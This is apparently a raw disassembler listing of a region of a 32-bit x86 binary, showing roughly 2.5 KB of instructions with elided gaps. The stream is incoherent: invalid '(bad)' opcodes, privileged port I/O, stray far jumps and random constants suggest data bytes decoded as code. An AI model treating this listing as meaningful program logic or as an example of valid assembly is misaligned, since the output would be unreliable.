  41ac9c:	fsubr  DWORD PTR [esp+ebx*1+0x1a902714]
  41aca3:	xchg   ecx,eax
  41aca4:	inc    eax
  41aca5:	test   eax,0xbbf0b7cc
  41acaa:	enter  0xb3c3,0x15
  41acae:	cmc    
  41acaf:	imul   ebx,DWORD PTR [ebx+0x1e1fab51],0xb9a9a0be
  41acb9:	mov    BYTE PTR [eax],bh
  41acbb:	sbb    eax,0xbf78eb0
  41acc0:	jnp    0x41ad1f
  41acc2:	fcomp  QWORD PTR [edi+0x22]
  41acc5:	adc    eax,0x2ee88eac
  41acca:	or     al,0xb2
  41accc:	ds in  al,0x3c
  41accf:	pop    ebp
  41acd0:	fs in  eax,dx
  41acd2:	inc    esi
  41acd3:	inc    ecx
  41acd4:	and    BYTE PTR [esi+esi*1-0x4b],bh
  41acd8:	inc    esp
  41acd9:	lods   al,BYTE PTR ds:[esi]
  41acda:	xor    BYTE PTR [esi+ebp*8-0x59efac7],cl
  41ace1:	jns    0x41ad08
  41ace3:	shl    DWORD PTR [ebx-0x642a1090],0x21
  41acea:	jno    0x41acd1
  41acec:	push   cs
  41aced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acee:	pop    edx
  41acef:	push   edx
  41acf0:	adc    ecx,eax
  41acf2:	ins    BYTE PTR es:[edi],dx
  41acf3:	xlat   BYTE PTR ds:[ebx]
  41acf4:	cmp    bl,dl
  41acf6:	add    DWORD PTR [edx+0x2f],0x80955e0f
  41acfd:	or     DWORD PTR [ebp+0x96bf756],edi
  41ad03:	mov    ebx,DWORD PTR [eax-0x61]
  41ad06:	les    edi,FWORD PTR [edx+0x4c]
  41ad09:	dec    esp
  41ad0a:	inc    ebp
  41ad0b:	out    0x58,eax
  41ad0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad0e:	std    
  41ad0f:	push   ebx
  41ad10:	clc    
  41ad11:	pusha  
  41ad12:	jecxz  0x41ad73
  41ad14:	push   ebx
  41ad15:	enter  0x56e,0x3b
  41ad19:	(bad)  
  41ad1a:	cmp    al,0x5e
  41ad1c:	jne    0x41ad78
  41ad1e:	push   ss
  41ad1f:	mov    es,WORD PTR [eax-0x34]
  41ad22:	inc    ecx
  41ad23:	das    
  41ad24:	leave  
  41ad25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad26:	pop    ds
  41ad27:	sar    BYTE PTR [edi*4+0x60e47faa],0xc7
  41ad2f:	ret    0xd180
  41ad32:	lds    edx,FWORD PTR [esi+0x37f426e8]
  41ad38:	imul   esi,DWORD PTR [esi+0x7d7cfd5d],0xfffffffd
  41ad3f:	pop    eax
  41ad40:	push   esp
  41ad41:	lds    esp,FWORD PTR [edx-0x70]
  41ad44:	call   0x756a:0x6da97de3
  41ad4b:	jbe    0x41ad73
  41ad4d:	xlat   BYTE PTR ds:[ebx]
  41ad4e:	xor    BYTE PTR [ebp+0x14],al
  41ad51:	sti    
  41ad52:	iret   
  41ad53:	ja     0x41acd5
  41ad55:	push   esp
  41ad56:	icebp  
  41ad57:	add    eax,0xbb4fe298
  41ad5c:	pop    es
  41ad5d:	sbb    esi,DWORD PTR [edi-0x68317b0e]
  41ad63:	inc    eax
  41ad64:	push   ss
  41ad65:	ror    eax,cl
  41ad67:	inc    ebx
  41ad68:	mov    dh,0xb2
  41ad6a:	and    BYTE PTR [ebx-0x5341d756],ah
  41ad70:	repnz pop es
  41ad72:	lods   eax,DWORD PTR ds:[esi]
  41ad73:	sub    eax,0xc45c4fef
  41ad78:	stos   BYTE PTR es:[edi],al
  41ad79:	and    DWORD PTR [edi*8-0x7f470723],ebx
  41ad80:	fsub   QWORD PTR [ebp+eax*8+0x47f62e84]
  41ad87:	int    0xea
  41ad89:	mov    cl,0x24
  41ad8b:	jne    0x41ad2d
  41ad8d:	xlat   BYTE PTR ds:[ebx]
  41ad8e:	in     eax,dx
  41ad8f:	retf   0x22
	...
  41adf2:	add    BYTE PTR [eax],al
  41adf4:	push   ebp
  41adf5:	clc    
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [ecx+esi*2+0x4e0590ba],esp
  41ae05:	sbb    eax,0x1050001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	shl    BYTE PTR [ebx-0x6d],cl
  41ae0f:	bound  edi,QWORD PTR [edi+0x639e7320]
  41ae15:	add    ah,BYTE PTR [esi-0x3f3befbd]
  41ae1b:	test   al,0x8c
  41ae1d:	icebp  
  41ae1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae1f:	xchg   DWORD PTR [edi+ebx*8],ebx
  41ae22:	ins    DWORD PTR es:[edi],dx
  41ae23:	(bad)  
  41ae24:	fild   QWORD PTR [eax-0x566b4ab]
  41ae2a:	and    al,0xbe
  41ae2c:	adc    BYTE PTR [esi+0x11af59ac],dh
  41ae32:	sbb    eax,0xf0a54d96
  41ae37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae38:	push   cs
  41ae39:	stos   BYTE PTR es:[edi],al
  41ae3a:	push   0x49111648
  41ae3f:	jecxz  0x41add8
  41ae41:	jno    0x41ae50
  41ae43:	jo     0x41ae48
  41ae45:	repz rol DWORD PTR [esi],1
  41ae48:	lods   eax,DWORD PTR ds:[esi]
  41ae49:	test   esi,edx
  41ae4b:	xlat   BYTE PTR ds:[ebx]
  41ae4c:	popa   
  41ae4d:	inc    eax
  41ae4e:	enter  0xaa8a,0x75
  41ae52:	imul   ebp,ebp,0x9b3e8663
  41ae58:	sub    al,0xf
  41ae5a:	cmp    eax,0x3be0e549
  41ae5f:	in     eax,0xf3
  41ae61:	or     edx,DWORD PTR [ecx+0x7acdbcd9]
  41ae67:	bound  esi,QWORD PTR [ecx-0x6f5c6484]
  41ae6d:	fwait
  41ae6e:	out    dx,al
  41ae6f:	test   al,0xab
  41ae71:	adc    bh,BYTE PTR [edx+0x12ea9d78]
  41ae77:	sbb    dl,BYTE PTR [ebx-0x51]
  41ae7a:	imul   edx,ebx,0xff876033
  41ae80:	out    0x98,eax
  41ae82:	mov    BYTE PTR [ecx+0x5b],al
  41ae85:	ficom  DWORD PTR [edi+0x22cb741b]
  41ae8b:	push   eax
  41ae8c:	xchg   ebx,eax
  41ae8d:	arpl   WORD PTR [eax+0x15a6103f],bx
  41ae93:	inc    esi
  41ae94:	test   BYTE PTR [esi],dl
  41ae96:	ss xchg edx,eax
  41ae98:	inc    ebx
  41ae99:	shl    BYTE PTR [ebp-0x11],cl
  41ae9c:	fbstp  TBYTE PTR [edx-0x75]
  41ae9f:	jmp    DWORD PTR [ebp-0x4d]
  41aea2:	dec    eax
  41aea3:	add    dl,BYTE PTR [ecx]
  41aea5:	mov    dh,0xb1
  41aea7:	sub    DWORD PTR [esi-0x1f],ecx
  41aeaa:	fsub   st,st(2)
  41aeac:	retf   0xe298
  41aeaf:	and    ebp,edx
  41aeb1:	imul   edx,DWORD PTR [ebx-0x3a67eaa3],0xfffffff6
  41aeb8:	or     ecx,DWORD PTR [edx+esi*4+0x5]
  41aebc:	add    al,0x99
  41aebf:	pop    edi
  41aec0:	or     ah,BYTE PTR [edi+0x1db3d08f]
  41aec6:	fcmovne st,st(5)
  41aec8:	jmp    0x41af19
  41aeca:	shr    DWORD PTR [edi+0x13ce1de5],cl
  41aed0:	pop    ecx
  41aed1:	xchg   DWORD PTR [ebx+ebx*4-0x64],edi
  41aed5:	sub    DWORD PTR [esp+ecx*2-0x59],esp
  41aed9:	and    BYTE PTR [edx+0x30ff5bb3],0x96
  41aee0:	xor    dl,BYTE PTR [edx+0x51b0ef24]
  41aee6:	fcomp  QWORD PTR [edi+0x73550b99]
  41aeec:	mov    ah,BYTE PTR [ecx]
  41aeee:	std    
  41aeef:	push   edi
  41aef0:	rcl    DWORD PTR fs:[esi],0xf0
  41aef4:	mov    DWORD PTR [edx-0x2e33e8d2],esi
  41aefa:	pop    edi
  41aefb:	lds    eax,FWORD PTR [ecx+esi*2]
  41aefe:	dec    ebx
  41aeff:	xor    ecx,DWORD PTR [esi]
  41af01:	mov    bh,0xef
  41af03:	sub    BYTE PTR [eax-0x6b],ah
  41af06:	rol    DWORD PTR [eax-0x7c],1
  41af09:	jp     0x41af7d
  41af0b:	and    BYTE PTR [ebx],0x67
  41af0e:	push   ecx
  41af0f:	push   0x8a
	...
  41af74:	(bad)  
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0x486e44ee
  41af82:	xchg   edi,eax
  41af83:	hlt    
  41af84:	push   ebx
  41af85:	push   ds
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    eax,0x9d000001
  41af8d:	mov    DWORD PTR [ecx],edx
  41af8f:	pusha  
  41af90:	das    
  41af91:	push   ebp
  41af92:	outs   dx,BYTE PTR ds:[esi]
  41af93:	cmp    DWORD PTR [ebx-0x6a],ecx
  41af96:	xor    al,0x54
  41af98:	adc    BYTE PTR [edi+0x3],0x40
  41af9c:	int3   
  41af9d:	jno    0x41afd2
  41af9f:	call   0xeba5:0x53fb7820
  41afa6:	mov    al,ds:0xe027c54b
  41afab:	and    cl,bl
  41afad:	dec    edi
  41afae:	add    al,BYTE PTR [ebx-0x5a2432a3]
  41afb4:	cdq    
  41afb5:	in     al,dx
  41afb6:	and    eax,0xce976d32
  41afbb:	xchg   BYTE PTR [ebx+eiz*4+0x3a3003b0],ah
  41afc2:	jecxz  0x41b00b
  41afc4:	call   0xdf32:0xc359790b
  41afcb:	pop    esp
  41afcc:	mov    dh,0xea
  41afce:	sub    ebp,DWORD PTR [edx+0x35a45f2a]
  41afd4:	push   eax
  41afd5:	icebp  
  41afd6:	imul   edi,eax,0xc5016b8d
  41afdc:	push   ebp
  41afdd:	call   0x14dda178
  41afe2:	in     eax,dx
  41afe3:	cmp    bl,BYTE PTR [edi+0x5]
  41afe6:	stos   DWORD PTR es:[edi],eax
  41afe7:	aam    0xfc
  41afe9:	jb     0x41b032
  41afeb:	inc    ebp
  41afec:	data16 int3 
  41afee:	fwait
  41afef:	in     al,dx
  41aff0:	repz cmp eax,0x652664f0
  41aff6:	bswap  eax
  41aff8:	(bad)  
  41affa:	out    0x94,al
  41affc:	arpl   si,bp
  41affe:	pop    edx
  41afff:	ret    
  41b000:	cmc    
  41b001:	(bad)  
  41b002:	aad    0xc4
  41b004:	pop    edx
  41b005:	aaa    
  41b006:	fld    st(7)
  41b008:	xchg   esp,eax
  41b009:	mov    ah,cl
  41b00b:	jmp    0x1879:0x85e451e8
  41b012:	mov    ch,BYTE PTR [ebx-0x5e]
  41b015:	out    0xb3,eax
  41b017:	xchg   edi,eax
  41b018:	xchg   BYTE PTR [eax-0x27],al
  41b01b:	mov    ebx,0xd33681a7
  41b020:	dec    ecx
  41b021:	or     DWORD PTR [edx+0xb],esp
  41b024:	dec    ebp
  41b025:	xchg   ebx,eax
  41b026:	fs xchg edi,eax
  41b028:	scas   eax,DWORD PTR es:[edi]
  41b029:	jns    0x41b023
  41b02b:	push   eax
  41b02d:	jg     0x41b01f
  41b02f:	into   
  41b030:	es lock push 0xfffffffe
  41b034:	sbb    ebx,DWORD PTR es:[esi+eax*4-0x9de8319]
  41b03c:	add    eax,0xe9cd3846
  41b041:	mov    ecx,0xc3aeed26
  41b046:	dec    ebp
  41b047:	or     BYTE PTR [esi+0x1e],dh
  41b04a:	outs   dx,BYTE PTR ds:[esi]
  41b04b:	and    ebp,edi
  41b04d:	inc    edx
  41b04e:	rcl    DWORD PTR [esi+0x635428af],0x8c
  41b055:	jl     0x41b0b4
  41b057:	jno    0x41b032
  41b059:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b05a:	inc    edx
  41b05b:	push   ss
  41b05c:	jl     0x41afed
  41b05e:	lods   al,BYTE PTR ds:[esi]
  41b05f:	adc    DWORD PTR es:[edi+ecx*8],esi
  41b063:	mov    dl,0xa9
  41b065:	rcl    BYTE PTR ds:0x17f30bf9,0x89
  41b06c:	leave  
  41b06d:	dec    ecx
  41b06e:	adc    eax,DWORD PTR [edx+0x1e8b4bf3]
  41b074:	xor    al,BYTE PTR [ecx]
  41b076:	mov    al,0xd5
  41b078:	push   0xffffff9e
  41b07a:	jb     0x41b02e
  41b07c:	fld    QWORD PTR [edx+0x1308d68a]
  41b082:	ret    0xb504
  41b085:	mov    ebx,0xe4f1717f
  41b08a:	xchg   edi,eax
  41b08b:	fimul  DWORD PTR [edi+ebx*1+0x9d0699]
	...
  41b0f2:	add    BYTE PTR [eax],al
  41b0f4:	(bad)  
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0x1504431a
  41b104:	pop    eax
  41b105:	pop    ds
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    eax,0xe0000001
  41b10d:	pop    ss
  41b10e:	push   esi
  41b10f:	mov    esi,0x17c52c13
  41b114:	les    ebx,FWORD PTR [edx]
  41b116:	inc    ebp
  41b117:	mov    edx,0x2911619d
  41b11c:	jmp    0x41b129
  41b11e:	add    al,0x5
  41b120:	leave  
  41b121:	lods   al,BYTE PTR ds:[esi]
  41b122:	in     al,0x7d
  41b124:	adc    ebx,DWORD PTR [esi]
  41b126:	dec    edi
  41b127:	and    edx,0x7f1875e
  41b12d:	(bad)  
  41b12e:	xor    eax,0xd0197ec5
  41b133:	popf   
  41b134:	mov    ebp,0xaf1dc2fb
  41b139:	inc    esi
  41b13a:	and    eax,0xb0a45463
  41b13f:	and    edi,edx
  41b141:	inc    esp
  41b142:	adc    eax,0x7c2b7792
  41b147:	ins    BYTE PTR es:[edi],dx
  41b148:	push   0xffffffee
  41b14a:	push   esi
  41b14b:	ror    cl,cl
  41b14d:	cmp    BYTE PTR [ebx+esi*4-0x1b57e251],al
  41b154:	shl    DWORD PTR [ebx+0x425fb86a],0x20
  41b15b:	popa   
  41b15c:	mov    ds:0xd0b8001b,eax
  41b161:	scas   al,BYTE PTR es:[edi]
  41b162:	scas   eax,DWORD PTR es:[edi]
  41b163:	adc    ah,dl
  41b165:	jo     0x41b176
  41b167:	dec    ecx
  41b168:	lock dec ecx
  41b16a:	adc    DWORD PTR [ebp-0x311c2bcc],edx
  41b170:	in     al,0xf2
  41b172:	rol    DWORD PTR [ebp+0x6e],0x42
  41b176:	xlat   BYTE PTR fs:[ebx]
  41b178:	cmc    
  41b179:	(bad)  
  41b17a:	sub    edi,DWORD PTR [ebx]
  41b17c:	cmp    eax,0x7ebf482f
  41b181:	rcr    edx,cl
  41b183:	test   BYTE PTR [ebx-0x4c463cf5],cl
  41b189:	int3   
  41b18a:	ret    0x9d9
  41b18d:	fcmovbe st,st(2)
  41b18f:	fiadd  WORD PTR [edi]
  41b191:	call   0xb7d0:0x400632cb
  41b198:	leave  
  41b199:	test   eax,0xfc4045ab
  41b19e:	pop    ebp
  41b19f:	ja     0x41b173
  41b1a1:	jmp    0x41b15d
  41b1a3:	jle    0x41b1c2
  41b1a5:	push   esp
  41b1a6:	bound  esi,QWORD PTR [esi+eax*2+0x23]
  41b1aa:	push   eax
  41b1ab:	pusha  
  41b1ac:	cmp    eax,DWORD PTR [ecx-0x1b30b941]
  41b1b2:	and    BYTE PTR [eax+0x43],ch
  41b1b5:	mov    BYTE PTR [esi+0x4d],cl
  41b1b8:	sub    dl,BYTE PTR [eax]
  41b1ba:	xchg   ebx,eax
  41b1bb:	sbb    BYTE PTR [esi],al
  41b1bd:	mov    ah,BYTE PTR ds:0xef995f08
  41b1c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1c4:	mov    esp,0x24461bf2
  41b1c9:	lods   eax,DWORD PTR ds:[esi]
  41b1ca:	std    
  41b1cb:	dec    ebp
  41b1cc:	jo     0x41b1bb
  41b1ce:	sbb    esi,ebp
  41b1d0:	lds    eax,FWORD PTR [eax+0x59]
  41b1d3:	mov    dh,0x8c
  41b1d5:	mov    ebp,0x47fe0cb8
  41b1da:	push   ebp
  41b1db:	xor    al,0x35
  41b1dd:	dec    ebx
  41b1de:	retf   
  41b1df:	cmp    BYTE PTR [edx+0x491000e8],ah
  41b1e5:	jmp    0xf17898a3
  41b1ea:	cmp    BYTE PTR [ebx],bh
  41b1ec:	xor    ecx,DWORD PTR [esi+0x17dd6b6a]
  41b1f2:	push   ss
  41b1f3:	arpl   WORD PTR [esi+0x3d1865a3],si
  41b1f9:	sbb    edx,edi
  41b1fb:	(bad)  
  41b1fc:	pop    ebp
  41b1fd:	cmc    
  41b1fe:	fmulp  st(1),st
  41b200:	(bad)  
  41b202:	ins    BYTE PTR es:[edi],dx
  41b203:	ror    DWORD PTR [eax],cl
  41b205:	jmp    0x41b1bd
  41b207:	call   0x38cd08a2
  41b20c:	xchg   edi,eax
  41b20d:	xchg   esi,eax
  41b20e:	lods   al,BYTE PTR ds:[esi]
  41b20f:	cmc    
  41b210:	test   eax,0x0
	...
  41b271:	add    BYTE PTR [eax],al
  41b273:	add    BYTE PTR [esi+0x6be069a5],cl
  41b279:	in     al,dx
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     dh,cl
  41b281:	clc    
  41b282:	scas   al,BYTE PTR es:[edi]
  41b283:	sahf   
  41b284:	pop    ebp
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR ds:0x89000001,al
  41b28d:	fistp  DWORD PTR [eax+0x40]
  41b290:	dec    esi
  41b291:	leave  
  41b292:	pushf  
  41b293:	aas    
  41b294:	sub    ch,dh
  41b296:	cld    
  41b297:	das    
  41b298:	iret   
  41b299:	lods   eax,DWORD PTR ds:[esi]
  41b29a:	mul    DWORD PTR [edx]
  41b29c:	pop    edi
  41b29d:	mov    esi,0x6ff947ec
  41b2a2:	stos   BYTE PTR es:[edi],al
  41b2a3:	push   ebp
  41b2a4:	sub    edx,DWORD PTR [esp+ebp*2]
  41b2a7:	mov    al,0x2f
  41b2a9:	mov    esp,es
  41b2ab:	cmc    
  41b2ac:	clc    
  41b2ad:	sbb    ch,BYTE PTR [ebp+0x79]
  41b2b0:	cmp    edi,DWORD PTR [ebp+0x450b486e]
  41b2b6:	(bad)  
  41b2b8:	test   al,0x28
  41b2ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2bb:	scas   al,BYTE PTR es:[edi]
  41b2bc:	jns    0x41b326
  41b2be:	leave  
  41b2bf:	or     esi,ebp
  41b2c1:	ret    0xa9d8
  41b2c4:	imul   eax,ebp,0x5c
  41b2c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2c8:	aaa    
  41b2c9:	sbb    esp,edi
  41b2cb:	sub    BYTE PTR [ebx+edx*8],bl
  41b2ce:	rcl    BYTE PTR [ecx+0x7493550f],1
  41b2d4:	mov    bh,0xd2
  41b2d6:	inc    eax
  41b2d7:	jg     0x41b273
  41b2d9:	jne    0x41b323
  41b2db:	and    cl,ah
  41b2dd:	pop    esp
  41b2de:	ja     0x41b317
  41b2e0:	push   esp
  41b2e1:	mov    ds:0xd87fcd3d,eax
  41b2e6:	int3   
  41b2e7:	pop    edi
  41b2e8:	push   eax
  41b2e9:	iret   
  41b2ea:	cs cdq 
  41b2ec:	(bad)  
  41b2ed:	inc    ebx
  41b2ee:	pop    edx
  41b2ef:	jne    0x41b330
  41b2f1:	test   DWORD PTR [ebp+0x742911ea],ebp
  41b2f7:	ret    0xd2cc
  41b2fa:	icebp  
  41b2fb:	mov    ebp,0x119b1e45
  41b300:	add    eax,0x21c8258a
  41b305:	pushf  
  41b306:	mov    ds:0xf86e6a20,al
  41b30b:	dec    edi
  41b30c:	mov    ebx,0x1b803ba4
  41b311:	sbb    al,BYTE PTR [ebp+0x75]
  41b314:	ss out 0x62,al
  41b317:	idiv   ebp
  41b319:	scas   eax,DWORD PTR es:[edi]
  41b31a:	inc    edx
  41b31b:	lea    eax,[ebp-0x1f]
  41b31e:	push   edi
  41b31f:	retf   0xf6fd
  41b322:	push   ebp
  41b323:	jns    0x41b382
  41b325:	fist   DWORD PTR [eax+0x18]
  41b328:	out    0x59,eax
  41b32a:	or     BYTE PTR [ebx],bl
  41b32c:	sti    
  41b32d:	or     al,0xec
  41b32f:	sbb    BYTE PTR [esi],al
  41b331:	or     eax,0xbfcb1837
  41b336:	sbb    BYTE PTR [edi-0x1e],0xdb
  41b33a:	push   ss
  41b33b:	sbb    esp,DWORD PTR [eax+0x49]
  41b33e:	adc    al,0x2e
  41b340:	push   edi
  41b341:	sub    eax,0x20d66577
  41b346:	mov    ds:0x7a92634a,al
  41b34b:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41b34d:	mov    DWORD PTR [eax+0x10],esp
  41b350:	test   al,0x3f
  41b352:	imul   ebp,DWORD PTR [ecx+0x46],0xffffffbe
  41b356:	mov    BYTE PTR [ebx-0x57],bh
  41b359:	mov    ecx,0x79c995ab
  41b35e:	je     0x41b3db
  41b360:	les    esp,FWORD PTR ds:0x52441735
  41b366:	jg     0x41b2f4
  41b368:	mov    dl,0x47
  41b36a:	rep movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41b36d:	or     ebp,esp
  41b36f:	test   eax,0xd0bc204a
  41b374:	fwait
  41b375:	test   BYTE PTR [eax],dl
  41b377:	mov    WORD PTR [eax+0x622f2d7e],?
  41b37d:	mov    eax,0x8879b5b
  41b382:	mov    ch,0x71
  41b384:	mov    ecx,ds
  41b386:	mov    eax,ds:0x55ba4d36
  41b38b:	(bad)
  41b38f:	stos   BYTE PTR es:[edi],al
  41b390:	xchg   ecx,eax
	...
  41b3f1:	add    BYTE PTR [eax],al
  41b3f3:	add    BYTE PTR [eax+0xd],cl
  41b3f6:	sbb    eax,0xfebb5dab
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	(bad)  
  41b401:	adc    bl,bh
  41b403:	sbb    esp,DWORD PTR [edx+0x21]
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    eax,0x5000001
  41b40d:	outs   dx,DWORD PTR ds:[esi]
  41b40e:	mov    al,0x75
  41b410:	repnz add DWORD PTR [esi],esi
  41b413:	(bad)  
  41b414:	in     eax,dx
  41b415:	je     0x41b3b7
  41b417:	cmp    BYTE PTR [ebx+0x758267f8],ch
  41b41d:	xchg   ebx,eax
  41b41e:	icebp  
  41b41f:	mov    ecx,0xbdf7db2e
  41b424:	xlat   BYTE PTR ds:[ebx]
  41b425:	in     al,0xc4
  41b427:	dec    esi
  41b428:	jo     0x41b3b4
  41b42a:	int    0x2f
  41b42c:	inc    esp
  41b42d:	cmp    esp,DWORD PTR [edx+0x38]
  41b430:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b431:	mov    dh,0x14
  41b433:	xchg   esp,eax
  41b434:	popa   
  41b435:	(bad)  
  41b436:	out    dx,al
  41b437:	adc    cl,BYTE PTR [edi]
  41b439:	popf   
  41b43a:	pop    esp
  41b43b:	mov    ebp,0xab33557f
  41b440:	dec    edx
  41b441:	clc    
  41b442:	mov    ds:0xdd5368c4,eax
  41b447:	sbb    DWORD PTR [esi+0x74],esp
  41b44a:	fwait
  41b44b:	aas    
  41b44c:	(bad)  
  41b44d:	sub    edi,edi
  41b44f:	adc    edx,DWORD PTR [eax]
  41b451:	cli    
  41b452:	mov    ecx,0x1f485039
  41b457:	and    dh,BYTE PTR [edx+0x15794637]
  41b45d:	outs   dx,DWORD PTR ds:[esi]
  41b45e:	cmp    BYTE PTR [edi-0x69],ah
  41b461:	retf   
  41b462:	pusha  
  41b463:	cwde   
  41b464:	xor    DWORD PTR [esi+0x5f653e23],ebx
  41b46a:	mov    edi,edi
  41b46c:	jmp    0x15347a5f
  41b471:	or     ebx,ecx
  41b473:	sbb    eax,0xae4301dd
  41b478:	push   ecx
  41b479:	push   ebp
  41b47a:	daa    
  41b47b:	jge    0x41b4a8
  41b47d:	or     dh,BYTE PTR [ecx-0x6a]
  41b480:	js     0x41b4a0
  41b482:	fld    TBYTE PTR [edx-0x8ee5edb]
  41b488:	jne    0x41b42a
  41b48a:	stos   DWORD PTR es:[edi],eax
  41b48b:	(bad)  
  41b48c:	repz or DWORD PTR [edi-0x53],esp
  41b490:	mov    dh,0x2
  41b492:	mov    esp,0x407cabc9
  41b497:	sbb    al,BYTE PTR [ecx-0x5f]
  41b49a:	pop    es
  41b49b:	cmp    ch,BYTE PTR [edx+0x4a]
  41b49e:	mov    edx,DWORD PTR [eax+0x41]
  41b4a1:	sbb    BYTE PTR [ebp+0x24],bl
  41b4a4:	pop    ebx
  41b4a5:	sbb    ebp,DWORD PTR [ebx]
  41b4a7:	cli    
  41b4a8:	jnp    0x41b4c2
  41b4aa:	jmp    0xc9027798
  41b4af:	out    dx,al
  41b4b0:	pusha  
  41b4b1:	and    DWORD PTR [ecx],ecx
  41b4b3:	cmp    al,0xdf
  41b4b5:	imul   esi,ecx,0x76ee2d09
  41b4bb:	out    dx,al
  41b4bc:	test   eax,0x3aa88255
  41b4c1:	mov    cl,0xb
  41b4c3:	lahf   
  41b4c4:	add    BYTE PTR [ebx+0x2],dl
  41b4c7:	and    esi,DWORD PTR [edi]
  41b4c9:	clc    
  41b4ca:	test   DWORD PTR ds:0x1c6fcc3,edi
  41b4d0:	icebp  
  41b4d1:	lods   al,BYTE PTR ds:[esi]
  41b4d2:	shl    DWORD PTR [ebp+eiz*1+0x380d2b29],1
  41b4d9:	dec    edi
  41b4da:	jo     0x41b523
  41b4dc:	and    DWORD PTR ds:0x950be5a1,edi
  41b4e2:	dec    esi
  41b4e3:	jbe    0x41b510
  41b4e5:	popa   
  41b4e6:	or     edx,ebp
  41b4e8:	lds    esi,FWORD PTR [edi-0x2ee6cedd]
  41b4ee:	test   BYTE PTR [edi],dl
  41b4f0:	repz int3 
  41b4f2:	std    
  41b4f3:	mov    eax,0x68393b0f
  41b4f8:	aad    0xca
  41b4fa:	xchg   edx,eax
  41b4fb:	inc    ebp
  41b4fc:	jle    0x41b484
  41b4fe:	test   al,0xc9
  41b500:	and    eax,0x3582e327
  41b505:	(bad)  fs:[ecx]
  41b508:	sbb    edi,0x286a69d1
  41b50e:	mov    edi,0x8746
	...
  41b573:	add    ah,dl
  41b575:	in     al,dx
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	lea    esi,[eax+0x22678374]
  41b586:	add    DWORD PTR [eax],eax
  41b588:	add    eax,0xdb000001
  41b58d:	add    BYTE PTR [ebx+edi*2+0x47],bh
  41b591:	ins    DWORD PTR es:[edi],dx
  41b592:	loope  0x41b556
  41b594:	inc    edx
  41b595:	ficomp DWORD PTR [edx+0x5b5c6a60]
  41b59b:	pop    ds
  41b59c:	jle    0x41b613
  41b59e:	jnp    0x41b561
  41b5a0:	js     0x41b579
  41b5a2:	sbb    ah,BYTE PTR [eax-0x28]
  41b5a5:	ret    0x9506
  41b5a8:	rol    BYTE PTR [edx-0x62603ab0],cl
  41b5ae:	shl    DWORD PTR [ecx-0x620723f6],cl
  41b5b4:	sub    ebx,DWORD PTR [ebx+0x1b1f6e74]
  41b5ba:	add    bl,al
  41b5bc:	xchg   edi,eax
  41b5bd:	int    0x92
  41b5bf:	push   0xffffffaf
  41b5c1:	test   DWORD PTR [ebx],ecx
  41b5c3:	push   esp
  41b5c4:	int3   
  41b5c5:	aam    0xf
  41b5c7:	sub    al,0x2e
  41b5c9:	gs lock jns 0x41b590
  41b5cd:	sahf   
  41b5ce:	repz inc ecx
  41b5d0:	data16 cmp al,0xca
  41b5d3:	js     0x41b5db
  41b5d5:	or     BYTE PTR [ebx],0x42
  41b5d8:	mov    edi,DWORD PTR [edx+0x139fa57a]
  41b5de:	add    DWORD PTR [ebp-0x752f2863],0x22
  41b5e5:	push   cs
  41b5e6:	inc    esi
  41b5e7:	pop    edx
  41b5e8:	sbb    eax,0x1b749bf7
  41b5ed:	addr16 lock leave 
  41b5f0:	xor    DWORD PTR [esi],ebx
  41b5f2:	fs aaa 
  41b5f4:	ja     0x41b5af
  41b5f6:	int    0xae
  41b5f8:	pop    ss
  41b5f9:	shl    BYTE PTR [ecx+0x619b7c39],cl
  41b5ff:	mov    bl,0x51
  41b601:	inc    edi
  41b602:	loope  0x41b677
  41b604:	or     bh,BYTE PTR [eax+0xf]
  41b607:	jnp    0x41b5f6
  41b609:	ins    BYTE PTR es:[edi],dx
  41b60a:	jle    0x41b5d0
  41b60c:	cli    
  41b60d:	sahf   
  41b60e:	and    DWORD PTR [edx-0x7793f9e7],esp
  41b614:	aas    
  41b615:	ds adc edx,ebx
  41b618:	sar    DWORD PTR [edx+0x1b],cl
  41b61b:	stc    
  41b61c:	mov    al,0x4f
  41b61e:	ret    
  41b61f:	jecxz  0x41b633
  41b621:	loop   0x41b5b2
  41b623:	ja     0x41b5a7
  41b625:	nop
  41b626:	inc    edi
  41b627:	xchg   ebx,eax
  41b628:	sbb    eax,0x2b292e9
  41b62d:	mov    eax,0x93acb223
  41b632:	out    dx,eax
  41b633:	xchg   ebx,eax
  41b634:	dec    ecx
  41b635:	jp     0x41b5f2
  41b637:	inc    edx
  41b638:	sti    
  41b639:	fst    DWORD PTR [ebx]
  41b63b:	jle    0x41b683
  41b63d:	pop    es
  41b63e:	mov    BYTE PTR [edx+0x9],ah
